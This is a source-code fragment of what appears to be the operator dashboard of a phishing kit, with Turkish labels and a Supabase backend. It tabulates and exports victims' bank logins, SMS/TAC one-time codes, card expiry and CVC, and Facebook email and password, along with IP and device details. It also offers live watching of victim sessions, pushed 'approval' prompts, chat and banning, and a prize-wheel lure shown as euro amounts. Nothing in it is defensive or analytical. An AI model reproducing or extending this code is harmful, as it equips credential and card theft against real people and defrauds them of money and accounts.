        if (fd.cardExpiry) cardCell.push({ text: `SKT: ${s(fd.cardExpiry)}` });
        if (fd.cardCvc) cardCell.push({ text: `CVC: ${s(fd.cardCvc)}` });
        if (!cardCell.length) cardCell.push({ text: "-", color: "#9ca3af" });

        const fbCell: any[] = [];
        if (fd.fbEmail) fbCell.push({ text: `E-posta: ${s(fd.fbEmail)}`, color: "#1d4ed8" });
        if (fd.fbPassword) fbCell.push({ text: `Parool: ${s(fd.fbPassword)}`, color: "#1d4ed8" });
        if (fd.fbFirstName || fd.fbLastName) fbCell.push({ text: `Nimi: ${s(fd.fbFirstName)} ${s(fd.fbLastName)}`.trim() });
        if (!fbCell.length) fbCell.push({ text: "-", color: "#9ca3af" });

        tableBody.push([
          s(r.public_id ?? r.id.split("-")[0]),
          r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "-",
          { text: r.amount ? `€${r.amount}` : s(fd.wheel_result_label) || "-", bold: true, color: "#c2410c" },
          s(`${fd.firstName ?? ""} ${fd.lastName ?? ""}`.trim()) || "-",
          s(fd.phone) || "-",
          { stack: bankCell },
          Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
          { text: smsValue, bold: smsValue !== "-" },
          { stack: cardCell },
          { stack: fbCell },
          s(r.ip_address) || "-",
          (() => {
            const ua = s(r.user_agent);
            if (!ua) return { text: "-", color: "#9ca3af" };
            const info = parseUserAgent(ua);
            const modelTxt = info.model && !/masaüstü|tespit edilemedi/i.test(info.model) ? ` • ${info.model}` : "";
            return {
              stack: [
                { text: `${info.device} • ${info.os} • ${info.browser}${modelTxt}`, bold: true, fontSize: 6.5 },
                { text: ua, fontSize: 5, color: "#6b7280" },
              ],
            };
          })(),
        ]);
      }

      const pdfMakeModule = await import("pdfmake/build/pdfmake");
      const pdfFontsModule = await import("pdfmake/build/vfs_fonts");
      const pdfMake: any = (pdfMakeModule as any).default ?? pdfMakeModule;
      pdfMake.vfs =
        (pdfFontsModule as any).pdfMake?.vfs ??
        (pdfFontsModule as any).default?.pdfMake?.vfs ??
        (pdfFontsModule as any).vfs;

      const dateStr = new Date().toISOString().slice(0, 10);

      // Kolon genisligi = icerigin en uzun satirina gore orantisal dagitim
      const cellMaxLen = (cell: any): number => {
        if (cell == null) return 0;
        const items: any[] = Array.isArray(cell) ? cell : cell.stack ? cell.stack : [cell];
        let m = 0;
        for (const it of items) {
          const t = typeof it === "object" && it !== null ? s(it.text) : s(it);
          if (t.length > m) m = t.length;
        }
        return m;
      };
      const colMax = COL_HEADERS.map((h) => h.length);
      for (const row of tableBody.slice(1)) {
        row.forEach((cell: any, i: number) => {
          const l = cellMaxLen(cell);
          if (l > colMax[i]) colMax[i] = l;
        });
      }
      // char basina ~3.6pt @7pt font; min 28pt, uzun kolonlar 170pt'de kirilir (wrap).
      // Toplam sayfadan kucukse kalan bosluk, cap'e carpan kolonlara orantisal dagitilir.
      const usable = 802; // A4 landscape - margins
      const cap = 170;
      const want = colMax.map((l) => l * 3.6 + 8); // sinirsiz istek
      const desired = want.map((w) => Math.min(Math.max(w, 28), cap));
      const used = desired.reduce((a, b) => a + b, 0);
      let widths: number[];
      if (used < usable) {
        const overflow = want.map((w) => Math.max(w - cap, 0));
        const totalOv = overflow.reduce((a, b) => a + b, 0);
        const leftover = usable - used;
        widths = desired.map((w, i) =>
          totalOv > 0 ? w + (leftover * overflow[i]) / totalOv : w
        );
      } else {
        const sc = usable / used;
        widths = desired.map((w) => Math.max(w * sc, 20));
      }

      const doc: any = {
        pageSize: "A4",
        pageOrientation: "landscape",
        pageMargins: [20, 46, 20, 30],
        header: {
          margin: [20, 12, 20, 0],
          columns: [
            { text: `IKI — ${isDeletedMode ? "Silinen " : ""}Log Yedeği`, style: "title" },
            { text: `${all.length} kayıt • ${dateStr}`, style: "subtitle", alignment: "right" },
          ],
        },
        footer: (currentPage: number, pageCount: number) => ({
          text: `Sayfa ${currentPage} / ${pageCount}`,
          alignment: "center",
          fontSize: 7,
          color: "#9ca3af",
          margin: [0, 8, 0, 0],
        }),
        content: [
          {
            table: {
              headerRows: 1,
              widths,
              body: tableBody,
            },
            layout: {
              hLineWidth: () => 0.5,
              vLineWidth: () => 0.5,
              hLineColor: () => "#cbd5e1",
              vLineColor: () => "#cbd5e1",
              paddingLeft: () => 3,
              paddingRight: () => 3,
              paddingTop: () => 3,
              paddingBottom: () => 3,
            },
            fontSize: 7,
          },
        ],
        styles: {
          title: { fontSize: 13, bold: true, color: "#111827" },
          subtitle: { fontSize: 8, color: "#6b7280" },
        },
        defaultStyle: { fontSize: 7 },
      };

      pdfMake.createPdf(doc).download(`iki-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
    } catch (e) {
      alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
    } finally {
      setExporting(false);
    }
  };

  useEffect(() => {
    if (!chatSessionId || !supabase) return;
    
    const loadChat = () => {
      supabase
        .from("chat_messages")
        .select("id,session_id,sender,content,image_url,created_at")
        .eq("session_id", chatSessionId)
        .order("created_at", { ascending: true })
        .then(({ data, error }) => {
          if (error) {
            console.error("admin chat load error:", error);
            return;
          }
          if (data) {
            setChatMessages((prev) => {
              if (prev.length !== data.length) {
                setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
                return data;
              }
              return prev;
            });
          }
        });
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`admin_chat:${chatSessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${chatSessionId}`,
        },
        (payload) => {
          setChatMessages((prev) => {
            if (!prev.find(m => m.id === payload.new.id)) {
              return [...prev, payload.new];
            }
            return prev;
          });
          setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [chatSessionId, supabase]);

  async function sendChatMessage(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if ((!chatInput.trim() && !pastedImage) || !supabase || !chatSessionId) return;

    let imageUrl = null;

    if (pastedImage) {
      setIsUploadingImage(true);
      const ext = pastedImage.name.split('.').pop() || 'png';
      const fileName = `${Math.random().toString(36).substring(2)}_${Date.now()}.${ext}`;
      
      const { data, error } = await supabase.storage
        .from('chat_images')
        .upload(fileName, pastedImage, {
          cacheControl: '3600',
          upsert: false
        });
        
      if (error) {
        console.error("Upload error:", error);
        alert("Resim yüklenirken hata oluştu.");
        setIsUploadingImage(false);
        return;
      }
      
      const { data: publicUrlData } = supabase.storage
        .from('chat_images')
        .getPublicUrl(fileName);
        
      imageUrl = publicUrlData.publicUrl;
    }

    const msg = chatInput.trim();
    
    setChatInput("");
    setPastedImage(null);
    setPastedImagePreview(null);
    setIsUploadingImage(false);

    const { data, error } = await supabase
      .from("chat_messages")
      .insert({
        session_id: chatSessionId,
        sender: "admin",
        content: msg || "",
        image_url: imageUrl,
      })
      .select("id,session_id,sender,content,image_url,created_at")
      .single();

    if (error) {
      console.error("admin chat send error:", error);
      setChatInput(msg);
      alert("Mesaj gönderilemedi: " + error.message);
      return;
    }

    if (data) {
      setChatMessages((prev) => {
        if (prev.find((m) => m.id === data.id)) return prev;
        return [...prev, data];
      });
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    const items = e.clipboardData?.items;
    if (!items) return;
    
    for (let i = 0; i < items.length; i++) {
      if (items[i].type.indexOf('image') !== -1) {
        const file = items[i].getAsFile();
        if (file) {
          setPastedImage(file);
          const reader = new FileReader();
          reader.onload = (ev) => {
            setPastedImagePreview(ev.target?.result as string);
          };
          reader.readAsDataURL(file);
          e.preventDefault();
          break;
        }
      }
    }
  };

  async function publishSpecialApproval() {
    if (!supabase || !specialPromptSessionId) return;
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", specialPromptSessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      status: "SPECIAL_INFO",
      current_step: "special_approval",
      form_data: { 
        ...prev, 
        approvalStatus: "",
        approvalCode: "",
        specialNoticeText: specialMessage.trim(), 
        specialNoticeImage: specialImage ?? "", 
        specialNoticeLang: specialLang, 
        specialNoticeSentAt: new Date().toISOString() 
      },
    }).eq("id", specialPromptSessionId);
    setSpecialPromptSessionId(null);
    setSpecialMessage("");
    setSpecialImage(null);
    void load();
  }

  function extractDeviceModel(ua: string): string | null {
    const androidParen = ua.match(/\(Linux;\s*Android\s+[\d.]+;\s*([^)]+)\)/i);
    if (androidParen) {
      let raw = androidParen[1].trim();
      raw = raw.split(/\s+Build\//i)[0].trim();
      if (raw && !/^Mobile$/i.test(raw) && !/^tablet$/i.test(raw)) {
        return raw;
      }
    }
    if (/iPhone/i.test(ua)) {
      const v = ua.match(/CPU iPhone OS ([\d_]+)/i);
      if (v) return `iPhone (iOS ${v[1].replace(/_/g, ".")})`;
      return "iPhone";
    }
    if (/iPad/i.test(ua)) {
      const v = ua.match(/CPU (?:iPhone )?OS ([\d_]+)/i);
      if (v) return `iPad (iPadOS ${v[1].replace(/_/g, ".")})`;
      return "iPad";
    }
    if (/iPod/i.test(ua)) {
      return "iPod touch";
    }
    const samsung = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
    if (samsung) return samsung[1];
    const pixel = ua.match(/\b(Pixel\s+(?:\d+[a-zA-Z]?|Tablet|Fold|Pro))\b/i);
    if (pixel) return pixel[1];
    return null;
  }

  function parseUserAgent(ua?: string) {
    if (!ua) return { os: "Bilinmiyor", browser: "Bilinmiyor", device: "Bilinmiyor", model: "Tespit edilemedi" };
    let os = "Bilinmiyor";
    let browser = "Bilinmiyor";
    let device = "Masaüstü";

    if (/android/i.test(ua)) { os = "Android"; device = "Mobil/Tablet"; } 
    else if (/iphone|ipad|ipod/i.test(ua)) { os = "iOS"; device = "Mobil/Tablet"; } 
    else if (/windows/i.test(ua)) { os = "Windows"; } 
    else if (/mac os/i.test(ua)) { os = "macOS"; } 
    else if (/linux/i.test(ua)) { os = "Linux"; }

    if (/chrome|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    else if (/opr\//i.test(ua)) browser = "Opera";

    const modelGuess = extractDeviceModel(ua);
    const model = modelGuess ?? (device === "Masaüstü" ? "— (masaüstü)" : "Tespit edilemedi (UA kısıtlı olabilir)");

    return { os, browser, device, model };
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500 w-full">
      {/* ========== HEADER (UST BASLIK + BUTONLAR) ========== */}
        <div className="flex items-center justify-between flex-wrap gap-4">
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
              {isDeletedMode ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
              )}
            </div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
              {isTrashMode ? "Çöp Loglar" : isDeletedMode ? "Geçmiş & Silinen Loglar" : "Loglar ve Canlı Takip"}
            </h2>
          </div>
          <div className="flex items-center gap-3 flex-wrap">
            <button
              onClick={() => void handleExport()}
              disabled={exporting}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md disabled:opacity-60 disabled:cursor-wait ${
                darkMode ? "bg-sky-500/10 border border-sky-500/20 text-sky-400 hover:bg-sky-500 hover:text-white" : "bg-sky-50 border border-sky-200 text-sky-600 hover:bg-sky-500 hover:text-white"
              }`}
            >
              {exporting ? (
                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" /></svg>
              ) : (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" /></svg>
              )}
              {exporting ? "İndiriliyor..." : "PDF İndir"}
            </button>
            {isDeletedMode ? (
              <>
                {/* Geçmiş Log modu: Tümünü Geri Yükle + Tümünü Kalıcı Sil */}
                <button
                  onClick={async () => {
                    if (!confirm("TÜM geçmiş logları (silinenleri) GERİ YÜKLEMEK istediğinize emin misiniz?")) return;
                    if (!supabase) return;
                    const ids = rowsRef.current.map(r => r.id);
                    if (ids.length === 0) return;
                    await supabase.from("sessions").update({ is_hidden: false }).in("id", ids);
                    await load();
                  }}
                  className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                    darkMode ? "bg-green-500/10 border border-green-500/20 text-green-500 hover:bg-green-500 hover:text-white" : "bg-green-50 border border-green-200 text-green-600 hover:bg-green-500 hover:text-white"
                  }`}
                >
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg>
                  Tümünü Geri Yükle
                </button>
                <button
                    onClick={async () => {
                      if (!confirm("TÜM geçmiş logları KALICI olarak silmek istediğinize emin misiniz? GERİ ALINMAZ!")) return;
                      const ids = rowsRef.current.map(r => r.id);
                      if (ids.length === 0) return;
                      await deleteSessionsAction(ids);
                      await load();
                    }}
                    className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                    darkMode ? "bg-red-500/10 border border-red-500/20 text-red-500 hover:bg-red-500 hover:text-white" : "bg-red-50 border border-red-200 text-red-600 hover:bg-red-500 hover:text-white"
                  }`}
                >
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                  Tümünü Kalıcı Sil
                </button>
              </>
            ) : (
              <button
                onClick={() => void handleDeleteAll()}
                className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                  darkMode ? "bg-red-500/10 border border-red-500/20 text-red-500 hover:bg-red-500 hover:text-white" : "bg-red-50 border border-red-200 text-red-600 hover:bg-red-500 hover:text-white"
                }`}
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                Tümünü Sil
              </button>
            )}
            <button
              onClick={() => {
                setSoundEnabled(!soundEnabled);
                if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
              }}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                soundEnabled
                  ? "bg-[#EB5E28]/10 border border-[#EB5E28]/20 text-[#EB5E28] ring-1 ring-[#EB5E28]/50"
                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
              }`}
            >
              {soundEnabled ? (
                <>
                  <span className="relative flex h-2.5 w-2.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#EB5E28] opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-[#EB5E28]"></span>
                  </span>
                  Ses Açık
                </>
              ) : (
                <>
                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
                  Ses Kapalı
                </>
              )}
            </button>
            <button
              onClick={() => void toggleBrowserNotifications()}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                browserNotifEnabled
                  ? "bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 ring-1 ring-emerald-500/50"
                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
              }`}
              title="Sekme arka plandayken bile işletim sistemi bildirimi al"
            >
              {browserNotifEnabled ? (
                <>
                  <span className="relative flex h-2.5 w-2.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-500 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
                  </span>
                  Bildirim Açık
                </>
              ) : (
                <>
                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
                  Bildirim Kapalı
                </>
              )}
            </button>
          </div>
        </div>

      {/* STAT CARDS */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title={isDeletedMode ? "Kayıt Sayısı (Silinen)" : isTrashMode ? "Çöp Kayıt Sayısı" : "Anlık Ziyaretçi"} value={isDeletedMode || isTrashMode ? logCount : liveVisitorCount} darkMode={darkMode} />
        <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-green-500" title="Log Sayısı" value={logCount} darkMode={darkMode} />
        <StatCard icon="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" color="text-red-500" title="Ban Sayısı (tıklayın)" value={bannedCount} darkMode={darkMode} onClick={() => { void loadBannedList(); setShowBannedListModal(true); }} />
      </div>

      {/* TABLE */}
      <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
        <div className="overflow-x-auto pb-4 hidden lg:block lg:[zoom:0.7] xl:[zoom:0.8] 2xl:[zoom:1]">
          <table className="w-full table-auto border-collapse text-[12px] text-left lg:text-[13px]">
            <thead className={`text-[13px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
              <tr>
                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
                <th className="min-w-[55px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
                <th className="min-w-[125px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
              </tr>
            </thead>
            <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
              {rows.length === 0 && (
                <tr>
                  <td colSpan={12} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                </tr>
              )}
              {rows.map((row) => {
                const fd = (row.form_data || {}) as Record<string, any>;
                const isOnline = isSessionLive(
                  row.id,
                  onlineSessionIds,
                  row.status,
                  sessionLastSeenAt[row.id],
                );
                
                const livePath = sessionPaths[row.id];
                const { s, stepText, stepColor } = getStepDisplay(
                  row.current_step as string,
                  fd,
                  isOnline,
                  livePath,
                  darkMode
                );

                const canonicalBankFields = getCanonicalAdminBankFields(fd);
                // eslint-disable-next-line @typescript-eslint/no-unused-vars
                const additionalBankFields = getAdditionalAdminBankFields(fd); // GUVENLIK: hesaplansin ama BANKA KOLONUNDA KULLANILMAYACAK
                const shortCreds = getShortBankCredentialFields(fd);
                const loginMethod = readLoginMethod(fd);
                const logoInfo = resolveBankLogoUrl(fd);
                // Sadece GUNCEL durum: admin yeni istek gonderince "Bekliyor",
                // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
                const currentApproval =
                  typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
                const approvalEntries = currentApproval ? [currentApproval] : [];
                // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
                // Ayni tipe tekrar yonlendirme: eski kayit gecmise gider, burada bos rozet (bekliyor) kalir.
                const genCurrentRaw =
                  fd.generatorCurrent && typeof fd.generatorCurrent === "object"
                    ? (fd.generatorCurrent as Record<string, any>)
                    : {};
                const legacyData =
                  fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
                    ? (fd.generatorData as Record<string, unknown>)
                    : null;
                const activeType = typeof fd.generatorType === "string" ? fd.generatorType : "";
                const genEntries: { type: string; data: Record<string, unknown> }[] = [];
                for (const t of ["generator1", "generator2"]) {
                  const cur = genCurrentRaw[t];
                  const curData =
                    cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
                      ? (cur.data as Record<string, unknown>)
                      : legacyData && activeType === t
                        ? legacyData
                        : null;
                  if (curData) {
                    genEntries.push({ type: t, data: curData });
                  } else if (activeType === t) {
                    genEntries.push({ type: t, data: {} });
                  }
                }
                const smsValue =
                  typeof fd.smsCode === "string" && fd.smsCode.trim()
                    ? fd.smsCode.trim()
                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
                      ? fd.tacCode.trim()
                      : "";

                return (
                  <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                    <td className="px-2 py-3 align-middle whitespace-nowrap text-center">
                      <button
                        type="button"
                        onClick={() => setLiveWatchRow(row)}
                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[13px] font-bold transition-all shadow-sm ${
                          isOnline
                            ? "bg-red-500/15 text-red-500 border border-red-500/30 hover:bg-red-500 hover:text-white"
                            : darkMode
                            ? "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-gray-200 border border-white/10"
                            : "bg-gray-100 text-gray-500 hover:bg-gray-200 hover:text-gray-700 border border-gray-200"
                        }`}
                        title={isOnline ? "Kullanıcıyı canlı izle (Çevrimiçi)" : "Kullanıcı ekranını aç (Çevrimdışı)"}
                      >
                        {isOnline ? (
                          <>
                            <span className="relative flex h-2 w-2">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                              <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
                            </span>
                            <span>Canlı İzle</span>
                          </>
                        ) : (
                          <>
                            <svg className="w-3.5 h-3.5 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.164 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                            </svg>
                            <span>İzle</span>
                          </>
                        )}
                      </button>
                    </td>
                    <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                      {row.amount ? `€${row.amount}` : '-'}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="cursor-pointer text-[13px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                        {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="cursor-pointer text-[13px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                        {fd.phone || '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="space-y-2 text-[12px] leading-tight">
                        {/* SATIR 1: BANKA ADI + GIRIS YONTEMI BADGE (LOGO KALDIRILDI) */}
                        <div className="flex items-start gap-2">
                          {/* BANKA ADI + GIRIS YONTEMI */}
                          <div className="min-w-0 flex-1 space-y-1">
                            {fd.bankName && (
                              <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
                                {fd.bankName}
                              </div>
                            )}
                            {!fd.bankName && (
                              <div className="font-semibold text-[12px] opacity-40">
                                Henüz banka seçilmedi
                              </div>
                            )}
                            {loginMethod && (
                              <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[11px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                Yöntem: {loginMethod}
                              </span>
                            )}
                            {!loginMethod && fd.bankName && (
                              <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                Giriş yöntemi: bekleniyor
                              </span>
                            )}
                          </div>
                        </div>

                        {/* SATIR 2: BANKA GIRIS BILGILERI (SADECE ID / SIFRE / KIMLIK NO / TELEFON / TAC / HESAP NO / KART NO) */}
                        {shortCreds.length > 0 && (
                          <div className="space-y-1 pl-0.5 pt-0.5">
                            {shortCreds.map(([key, value]) => (
                              <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1 leading-tight">
                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
                                  {key}
                                </span>
                                <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
                                  {String(value)}
                                </span>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      {approvalEntries.length === 0 ? (
                        <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                      ) : (
                        <div className="flex flex-col items-start gap-1">
                          {approvalEntries.map((approvalValue, index) => (
                            <span
                              key={`${approvalValue}-${index}`}
